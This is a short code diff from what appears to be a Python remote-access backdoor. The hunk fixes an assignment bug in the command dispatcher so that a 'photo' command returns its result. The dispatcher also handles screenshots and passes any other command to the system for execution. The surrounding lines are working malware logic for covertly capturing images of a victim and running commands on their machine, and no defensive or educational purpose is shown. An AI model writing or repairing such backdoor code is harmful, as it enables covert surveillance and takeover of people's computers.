@@ -109,7 +109,7 @@ class Backdoor:
                 elif command[0] == 'screenshot':
                     command_result = self.screenshot()
                 elif command[0] == 'photo':
-                    command_result == self.photo()
+                    command_result = self.photo()
                 else:
                     command_result = self.execute_system_command(command)
             except Exception as e:
